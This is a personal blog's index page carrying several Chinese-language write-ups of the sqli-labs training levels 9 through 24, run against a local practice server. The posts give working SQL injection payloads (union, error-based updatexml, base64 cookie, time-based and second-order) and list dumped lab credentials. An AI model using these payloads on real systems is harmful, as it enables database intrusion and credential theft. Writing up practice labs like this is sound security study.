<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-sql-labs-Less-24" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/14/sql-labs-Less-24/" class="article-date">
  <time datetime="2021-02-14T06:11:13.000Z" itemprop="datePublished">2021-02-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-24/">http://127.0.0.1/sql/Less-24/</a></p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png" alt="1"><br>注册一个新账号：admin’#,密码：123</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/2.png" alt="2"><br>再登录，然后把密码改成123456,改好后再用admin，123456登录。</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/3.png" alt="3"><br>登陆成功。<br>查看数据库：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/4.png" alt="4"></p>
<h2>小结</h2>
https://www.jianshu.com/p/3fe7904683ac
https://www.cnblogs.com/cute-puli/p/11145758.html
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/14/sql-labs-Less-24/" data-id="ckl54fzm40000o8uxewbqa1dx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-23" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/13/sql-labs-Less-23/" class="article-date">
  <time datetime="2021-02-13T08:29:16.000Z" itemprop="datePublished">2021-02-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23%EF%BC%8C%E8%BE%93%E5%85%A5?id=1">http://127.0.0.1/sql/Less-23，输入?id=1</a> 正常输出。<br>输入’发生报错：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/1.png" alt="1"><br>查看源代码：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/13/sql-labs-Less-23/2.png" alt="2"><br>发现对注释符进行了过滤，所以我们不能用注释法了，只能用闭合法。<br>再输入一个’，又正常了，说明可以用’注入。<br>注入：<br>查列数：id=1’union select 1,2,3’<br>查输出位置：id=-1’union select 1,2,3’<br>爆库：id=-1’union select 1,database(),3’<br>爆表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)’<br>爆列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’)’<br>爆数据：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-23/?id=-1&#39;union">http://127.0.0.1/sql/Less-23/?id=-1&#39;union</a> select 1,(select group_concat(username) from users),(select group_concat(password) from users)’ </p>
<p>ps:可以报错注入，延时注入，可以利用 or ‘1’=’1进行闭合。<br>这里不能用order by去判断列数，因为无论order by 多少都不报错，可以理解为order by 在执行的时候被忽略了，这是由于mysql解析顺序决定的。<br>（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/annsshadow/p/5037667.html%EF%BC%89">https://www.cnblogs.com/annsshadow/p/5037667.html）</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/13/sql-labs-Less-23/" data-id="ckl3x2oxo00000suxc3yh64sl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-21~22" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/12/sql-labs-Less-21~22/" class="article-date">
  <time datetime="2021-02-12T15:18:18.000Z" itemprop="datePublished">2021-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-21</h1>

<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-21%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-21和前两关一样，打开http</a> header live再登陆：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/1.png" alt="1"><br>在http header live中看到我们的cookie变成了YWRtaW4=（图里的%3D是=的url编码，实际上还是前面那个）<br>还有YWRtaW4=其实是经过了base64编码处理的admin，所以我们注入时也要把我们的语句进行base64编码处理。<br>前面几关说到的hackbar就有base64编码的功能，我们可以用它来进行我们的注入：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/2.png" alt="2"><br>上面是对选中的字进行base64转码，下面的是逆转。<br>开始注入：<br>1)判断：uname=YWRtaW4n     (uname=admin’)</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/3.png" alt="3"><br>闭合：uname=YWRtaW4nJw==   (uname=admin’’)<br>注释：uname=YWRtaW4nKSM=   (uname=admin’)#)<br>2)爆库：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSlhbmQn<br>(uname=admin’and updatexml(1,concat(0x7e,(select database()),0x7e),1)and’)<br>爆表：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPSdzZWN1cml0eScgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1)and’)<br>爆列：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgY29sdW1uX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1)and’)<br>注释的话是uname=<code>admin&#39;and updatexml(1,concat(0x7e,(构造的语句),0x7e),1))#</code>，把阴影部分的base64转码就行了。</p>
<h1>Less-22</h1>
和Less-21一样，只是把'改成"

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/12/sql-labs-Less-21~22/" data-id="ckl3c1h0e0000bkux55147sd5" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-20" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/12/sql-labs-Less-20/" class="article-date">
  <time datetime="2021-02-12T10:08:42.000Z" itemprop="datePublished">2021-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/12/sql-labs-Less-20/">sql-labs-Less-20</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-20/%EF%BC%8C%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-20/，和前两关一样，打开http</a> header live再登陆：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/1.png" alt="1"><br>我们可以看到我们的user agent、IP地址、cookie、登录名和密码，由20关的题目可以知道要在cookie里注入。<br>打开hackerbar,把相应的地方先填好:</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/2.png" alt="2"><br>在cookie输入’，发生报错：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/3.png" alt="3"><br>再输入#(这里如果用’会没有报错，但有一部分会没有输出,但也是可以用的)，正常输出了，说明可以用’注入（也可以看报错中有<code>&#39;admin&#39;</code>）。<br>可以注入了：<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)#<br>uname=admin’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1)and’<br>，接下来跟前两关差不多了。</p>
<p>ps：cookie也可以登录后再刷新一次，再打开已经打开的http header live，查看：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-20/4.png" alt="4"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/12/sql-labs-Less-20/" data-id="ckl2dxj9p0000g4ux47ujawev" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-19" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/11/sql-labs-Less-19/" class="article-date">
  <time datetime="2021-02-11T06:56:08.000Z" itemprop="datePublished">2021-02-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/11/sql-labs-Less-19/">sql-labs-Less-19</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-19/">http://127.0.0.1/sql/Less-19/</a> ，并登入，显示IP地址和referer与Less-18相似：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/1.png" alt="1"><br>因为显示了referer，又因为与Less-18相似，所以我们尝试一下在referer注入。</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/2.png" alt="2"><br>画横线的部分可以按照Less-18的方法找出来，在referer里输入’，发现报错：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/11/sql-labs-Less-19/3.png" alt="3"><br>且报错语句中有<code>127.0.0.1&#39;)</code>，这时我们可以联想到Less-18，推测出原语句可能是(‘abc’,…,’abc’)这样的。<br>再输入一个’，发现正常登入了，说明可以用’注入。<br>注入语句：<br>1)闭合法：’and updatexml(1,concat(0x7e,(相应的语句),0x7e),1) and’<br>2)注释法：’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’)#<br>接下来跟Less-18差不多了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/11/sql-labs-Less-19/" data-id="ckl0zmcaa0000w4uxcoqw4e94" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-18" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/10/sql-labs-Less-18/" class="article-date">
  <time datetime="2021-02-10T09:44:55.000Z" itemprop="datePublished">2021-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/10/sql-labs-Less-18/">sql-labs-Less-18</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-18</h1>

<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/%EF%BC%8Cusername%E5%92%8Cpassword%E8%BE%93%E5%85%A5admin%E7%99%BB%E5%85%A5%EF%BC%9A">http://127.0.0.1/sql/Less-18/，username和password输入admin登入：</a></p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/1.png" alt="1"><br>显示了我们的IP地址（这个没登入也有）和agent；<br>通过查看源代码：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/2.png" alt="2"><br>看到username和password都用了check_input()函数，所以不能在username和password里进行注入。<br>但是在源代码看到<br><code>$insert=&quot;INSERT INTO </code>security<code>.</code>uagents<code> (</code>uagent<code>, </code>ip_address<code>, </code>username<code>) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code><br>意思是将useragent和ip插入到数据库中，所以我们可以在useragent和ip这里考虑一下注入。Ip地址我们这里修改不是很方便，但是useragent修改较为方便，我们从useragent入手。<br>首先我们把http header live(火狐浏览器的插件)打开</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/3.png" alt="3"><br>在<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-18/">http://127.0.0.1/sql/Less-18/</a> 登入后再把刚才那个http header live打开</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/4.png" alt="4"><br>可以看到我们的User-Agent，点击进入：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/5.png" alt="5"><br>接下来按f12打开hackbar（火狐浏览器插件）</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/6.png" alt="6"><br>再这样：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/7.png" alt="7"><br>再在U那个栏里面输入’,发现报错：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/8.png" alt="8"><br>且语句中有<code>127.0.0.1&#39;, &#39;admin&#39;)</code>,我们可以猜想原语句可能是(‘ABC’,…’ABC’…,’ABC’)这样的。<br>我们再输入一个’测试一下：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/10/sql-labs-Less-18/9.png" alt="9"><br>发现没有报错，说明是用’注入的。<br>知道了注入字符，接下来就开始注入了，这里用的是报错注入，不能用布尔盲注，因为无论错误还是正确都不会报错。<br>爆库：输入’and updatexml(1,concat(0x7e,(select database()),0x7e),1) and’<br>爆表：’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1) and’<br>爆列：’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1) and’<br>爆数据：’and updatexml(1,concat(0x7e,(select id from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) and’<br>‘and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) and’</p>
<p>以上也可以用’and updatexml(1,concat(0x7e,(构造的语句),0x7e),1) ,’’,’’)#<br>上面有,’’,’’)是因为报错里有127.0.0.1、admin，而且只输入’,’’,’’)#没有报错。</p>
<p>PS:如果用hackbar在user-agent进行注入没反应的话可能要把浏览器重启一下。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/10/sql-labs-Less-18/" data-id="ckkzsewlz0000dwux0gxkdvnu" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-17" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/09/sql-labs-Less-17/" class="article-date">
  <time datetime="2021-02-09T08:35:56.000Z" itemprop="datePublished">2021-02-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/09/sql-labs-Less-17/">sql-labs-Less-17</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-17</h1>

<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-17/%EF%BC%8C%E6%98%BE%E7%A4%BA%E5%A6%82%E4%B8%8B%EF%BC%9A">http://127.0.0.1/sql/Less-17/，显示如下：</a></p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/1.png" alt="1"><br>在username里输入admin，password里输入1’（这里是因为不知道密码）,报错了：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/2.png" alt="2"><br>再把password的1’改成1’#。正常输出，说明可以用’注入。<br>接下来就在password那里进行注入可以用布尔盲注、延时注入和报错注入。<br>然后求出表名：users，列名：username和password。</p>
<h1>小结</h1>
1.这次我们为什么不在username进行注入而是在password进行注入呢？

<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/3.png" alt="3"><br>我们查看源代码发现一个check_input()函数。<br>check_input()函数有什么用呢,先说一下下面这些函数：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/4.png" alt="4"><br><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/09/sql-labs-Less-17/5.png" alt="5"><br>在我们less17的check_input()中，对username进行各种转义的处理，所以此处不能使用username进行注入。</p>
<p>2.报错注入<br>select extractvalue(1,concat(0x7e,(构造的语句),0x7e));<br>//select extractvalue(1,concat(0x7e,(select database()),0x7e));</p>
<p>select updatexml(1,concat(0x7e,(构造的语句),0x7e),1);<br>//select updatexml(1,concat(0x7e,(select database()),0x7e),1);</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/09/sql-labs-Less-17/" data-id="ckky8po0o00006oux6wfogw23" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-13~16" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/07/sql-labs-Less-13~16/" class="article-date">
  <time datetime="2021-02-07T03:04:58.000Z" itemprop="datePublished">2021-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/07/sql-labs-Less-13~16/">sql-labs-Less-13~16</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-13</h1>
首先进入http://127.0.0.1/sql/Less-13/，输入账号和密码，显示如下：

<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/07/sql-labs-Less-13~16/1.png" alt="1"><br>登入成功，但没有信息的回显，这时候就想到可能要用布尔盲注。<br>在账号后面加上’，显示如下：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/07/sql-labs-Less-13~16/2.png" alt="2"><br>说明有注入漏洞，而且错误显示<code>admin&#39;) LIMIT 0,1</code>，说明可能要用’)字符注入。<br>测试一下’)：在账号后面加上’)#，在输入密码，显示登入成功，说明是用’)字符注入的。<br>也可以把’)改成\，不输入密码再次登入，\的后面是’)，说明是用’)注入的。<br>在账号后面加上’) order by 2#，登入正常，说明有两列数据。<br>在输入admin’) and <code>length(database())=8</code>#登入正常，说明库名长度为8。<br>剩下的跟Less-5~6一样，在上一句的阴影部分改一下就行了。</p>
<h1>Less-14</h1>
和13一样，只是把')改成"。

<h1>Less-15</h1>
和上面一样，注入字符换成'。

<h1>Less-16</h1>
和上面一样，注入字符换成")。

<h1>小结</h1>
也可以用延时注入的方法(if函数和sleep函数)。







































      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/07/sql-labs-Less-13~16/" data-id="ckkwiqjij0000uwuxbjj07h0w" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-11~12" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/06/sql-labs-Less-11~12/" class="article-date">
  <time datetime="2021-02-06T09:18:42.000Z" itemprop="datePublished">2021-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/06/sql-labs-Less-11~12/">sql-labs-Less-11~12</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-11</h1>

<p>进入 <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-11">http://127.0.0.1/sql/Less-11</a> ，显示如下：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/1.png" alt="1"></p>
<p>都输入admin进行登入：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/2.png" alt="2"></p>
<p>然后进行sql注入判断，在username输入admin’，在password输入admin，显示如下：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/3.png" alt="3"></p>
<p>说明有sql注入漏洞，再在username输入admin’#,password不变，正常登入，说明可以用<code>‘</code>注入。<br>也可以在username输入admin\，password不输，显示如下：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/4.png" alt="4"></p>
<p>看到\后面是<code>&#39;</code>，说明可以用<code>&#39;</code>注入。</p>
<p>在username输入admin’ order by 2#，正常输出，说明数据有两列。<br>再在username输入1admin’ union select 1,2#(前面的1和less-1的id=-1是一样的道理)：</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/5.png" alt="5"></p>
<p>可以看到1在username输出，2在password输出。<br>在username输入1admin’ union select 1,database()#：(也可以用1admin’ union select 1,schema_name from information_schema.schemata limit 4,1#(这个要一个一个查)或1admin’ union select 1,group_concat(schema_name) from information_schema.schemata#(查全部库名))</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/6.png" alt="6"></p>
<p>可以看到在password输出了库名：security<br>再在username输入1admin’ union select 1,table_name from information_schema.tables where table_schema=’security’ limit 0,1#(也可以用1admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’security’#)(以下都是用group_concat函数的)</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/7.png" alt="7"></p>
<p>得到表名：emails,referers,uagents,users<br>再在username输入1admin’ union select 1,column_name from information_schema.columns where table_name=’users’ limit 0,1#(也可以用1admin’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#)</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/8.png" alt="8"></p>
<p>得到列名：id,username,password<br>再在username输入1admin’ union select username,password from users limit 0,1#(也可以用1admin’ union select group_concat(username),group_concat(password) from users#)</p>
<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/06/sql-labs-Less-11~12/9.png" alt="9"></p>
<p>得到用户名和密码：<br>username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p>
<h1>Less-12</h1>

<p>和Less-11一样，只是把’换成了”)。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/06/sql-labs-Less-11~12/" data-id="ckktlz2iv0000l8ux9b376ms4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-sql-labs-Less-9-10" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/03/sql-labs-Less-9-10/" class="article-date">
  <time datetime="2021-02-03T09:21:11.000Z" itemprop="datePublished">2021-02-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/03/sql-labs-Less-9-10/">sql-labs Less-9~10</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>Less-9</h1>
进入http://127.0.0.1/sql/Less-8，输入/?id=1,正常输出，加上'，正常输出，再加上--+，还是正常输出，换其他字符尝试，还是正常输出。
这时要换其他方法判断能不能注入以及注入字符，这里可以用延迟注入(?)，即在1'后面加and sleep(5)--+,如果能用'注入，则会在加载5秒后再输出，否则会较快的输出。
接下来的步骤和Less-5~6或Less-8一样。

<h1>Less-10</h1>
和Less-9一样，只是把'换成"。

<h1>小结</h1>
延迟注入：用sleep函数，如果可以注入则会再加载指定时间后输出，否则会较快的输出。
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/03/sql-labs-Less-9-10/" data-id="ckkp9f5vo0000swux5wmihkxs" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/02/14/sql-labs-Less-24/">sql-labs-Less-24</a>
          </li>
        
          <li>
            <a href="/2021/02/13/sql-labs-Less-23/">sql-labs-Less-23</a>
          </li>
        
          <li>
            <a href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
          </li>
        
          <li>
            <a href="/2021/02/12/sql-labs-Less-20/">sql-labs-Less-20</a>
          </li>
        
          <li>
            <a href="/2021/02/11/sql-labs-Less-19/">sql-labs-Less-19</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>